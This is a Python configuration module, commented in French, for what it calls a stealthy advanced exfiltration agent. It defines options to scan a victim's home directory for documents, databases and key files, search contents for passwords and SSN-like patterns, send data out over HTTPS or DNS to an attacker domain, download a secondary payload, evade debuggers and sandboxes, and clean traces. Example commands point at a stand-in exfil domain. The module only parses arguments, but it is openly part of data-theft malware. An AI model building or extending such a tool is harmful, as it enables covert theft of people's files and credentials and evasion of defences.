import argparse
import os
import sys

class Configuration:
    """
    Gère la configuration de l'agent d'exfiltration via les arguments en ligne de commande.
    """
    def __init__(self):
        self.parser = argparse.ArgumentParser(
            description="Agent d'exfiltration furtif avancé.",
            formatter_class=argparse.RawTextHelpFormatter
        )
        self._add_arguments()
        self.args = self.parser.parse_args()
        self._validate_arguments()

    def _add_arguments(self):
        """
        Définit tous les arguments attendus pour l'agent.
        """
        self.parser.add_argument(
            '--target',
            type=str,
            required=True,
            help="URL de la cible d'exfiltration (ex: https://exfil.domain.com/upload)."
        )
        self.parser.add_argument(
            '--scan',
            type=str,
            default=os.path.expanduser('~'), # Par défaut, scanner le répertoire utilisateur
            help="Chemin du répertoire à scanner (ex: /home, C:\\Users\\Public)."
        )
        self.parser.add_argument(
            '--types',
            type=str,
            default=".doc,.docx,.txt,.pdf,.xls,.xlsx,.csv,.db,.sqlite,.json,.xml,.key,.pem,.pptx,.log,.md",
            help="Liste des extensions de fichiers à inclure, séparées par des virgules (ex: .doc,.txt)."
        )
        self.parser.add_argument(
            '--exclude-types',
            type=str,
            default=".exe,.dll,.sys,.bin,.tmp,.py,.sh,.bak,.old",
            help="Liste des extensions de fichiers à exclure, séparées par des virgules (ex: .exe,.dll)."
        )
        self.parser.add_argument(
            '--min-size',
            type=str,
            default="1k", # Minimum 1 KB
            help="Taille minimale des fichiers à exfiltrer (ex: 5k, 1M, 1G). Supporte k, M, G."
        )
        self.parser.add_argument(
            '--max-size',
            type=str,
            default="100M", # Maximum 100 MB
            help="Taille maximale des fichiers à exfiltrer (ex: 1M, 100M). Supporte k, M, G."
        )
        self.parser.add_argument(
            '--method',
            type=str,
            default="https",
            choices=["https", "dns"],
            help="Méthode d'exfiltration principale (https ou dns)."
        )
        self.parser.add_argument(
            '--key',
            type=str,
            required=True,
            help="Clé secrète AES pour le chiffrement des données (doit être de 16, 24 ou 32 bytes)."
        )
        self.parser.add_argument(
            '--dns-server',
            type=str,
            default="8.8.8.8", # Serveur DNS par défaut (peut être ajusté pour le C2)
            help="Serveur DNS à utiliser pour l'exfiltration DNS (ex: 8.8.8.8)."
        )
        self.parser.add_argument(
            '--dns-domain',
            type=str,
            help="Domaine d'exfiltration DNS (nécessaire si la méthode est 'dns')."
        )
        self.parser.add_argument(
            '--debug',
            action='store_true',
            help="Active le mode débogage pour des logs plus verbeux et désactive la furtivité."
        )
        self.parser.add_argument(
            '--log-file',
            type=str,
            default="agent_logs.enc",
            help="Nom du fichier de journalisation chiffré localement (dans le répertoire racine de l'agent)."
        )
        self.parser.add_argument(
            '--no-clean',
            action='store_true',
            help="Ne pas nettoyer les traces après exécution (utile pour le débogage)."
        )
        self.parser.add_argument(
            '--no-anti-evasion',
            action='store_true',
            help="Désactive les contrôles anti-évasion (anti-debug/sandbox)."
        )
        self.parser.add_argument(
            '--threads',
            type=int,
            default=4,
            help="Nombre de threads à utiliser pour le scanning et l'upload simultané."
        )
        self.parser.add_argument(
            '--payload-url',
            type=str,
            help="URL pour télécharger une charge utile optionnelle (pour le module Payload Dropper)."
        )
        self.parser.add_argument(
            '--payload-path',
            type=str,
            help="Chemin où déposer la charge utile téléchargée."
        )
        self.parser.add_argument(
            '--keywords',
            type=str,
            help="Liste de mots-clés à rechercher dans le contenu des fichiers (séparés par des virgules)."
        )
        self.parser.add_argument(
            '--regex-patterns',
            type=str,
            help="Liste de motifs regex à rechercher dans le contenu des fichiers (séparés par des virgules)."
        )

    def _validate_arguments(self):
        """
        Valide la cohérence et la validité des arguments fournis.
        """
        if self.args.method == "dns" and not self.args.dns_domain:
            self.parser.error("--dns-domain est requis lorsque la méthode d'exfiltration est 'dns'.")

        # La clé AES doit être de 16, 24 ou 32 bytes (128, 192 ou 256 bits)
        # La logique AES256Cipher hash la clé si la longueur n'est pas 32.
        # Ici on valide juste qu'elle n'est pas vide pour éviter des erreurs plus tard.
        if not self.args.key:
             self.parser.error("La clé AES (--key) est obligatoire et ne peut pas être vide.")

        # Convertir les tailles en bytes
        try:
            self.args.min_size_bytes = self._parse_size(self.args.min_size)
            self.args.max_size_bytes = self._parse_size(self.args.max_size)
        except ValueError as e:
            self.parser.error(f"Erreur de format de taille: {e}")


        if self.args.min_size_bytes > self.args.max_size_bytes:
            self.parser.error("La taille minimale ne peut pas être supérieure à la taille maximale.")

        # Convertir les types de fichiers, mots-clés et regex en listes
        self.args.types = [f.strip().lower() for f in self.args.types.split(',') if f.strip()]
        self.args.exclude_types = [f.strip().lower() for f in self.args.exclude_types.split(',') if f.strip()]
        self.args.keywords = [kw.strip() for kw in self.args.keywords.split(',') if kw.strip()] if self.args.keywords else []
        self.args.regex_patterns = [rp.strip() for rp in self.args.regex_patterns.split(',') if rp.strip()] if self.args.regex_patterns else []

    def _parse_size(self, size_str):
        """
        Convertit une chaîne de taille (ex: "5k", "1M") en bytes.
        """
        size_str = size_str.lower()
        if size_str.endswith('k'):
            return int(size_str[:-1]) * 1024
        elif size_str.endswith('m'):
            return int(size_str[:-1]) * 1024 * 1024
        elif size_str.endswith('g'):
            return int(size_str[:-1]) * 1024 * 1024 * 1024
        else:
            try:
                return int(size_str)
            except ValueError:
                raise ValueError(f"Format de taille invalide: {size_str}. Utilisez des suffixes comme 'k', 'M', 'G' ou des nombres entiers.")

    def get_config(self):
        """
        Retourne l'objet d'arguments parsé.
        """
        return self.args

if __name__ == "__main__":
    # Test d'exemple du module de configuration
    # Pour exécuter : python3 modules/config.py --target https://example.com/upload --key "azertyuiopmlkjhg"
    # Ou avec plus d'options pour tester:
    # python3 modules/config.py --target https://example.com/upload --scan /tmp --types .txt,.log --min-size 10k --method dns --dns-domain exfil.yourdomain.com --key "azertyuiopmlkjhg" --debug --keywords "secret,password" --regex-patterns "(\d{3}-\d{2}-\d{4})"
    try:
        config_instance = Configuration()
        conf = config_instance.get_config()
        print("\n--- Configuration de l'agent ---")
        for arg, value in vars(conf).items():
            print(f"{arg}: {value}")
        print("------------------------------")
    except SystemExit as e:
        print(f"Erreur de configuration (SystemExit): {e}")
    except Exception as e:
        print(f"Erreur de configuration (Exception): {e}")


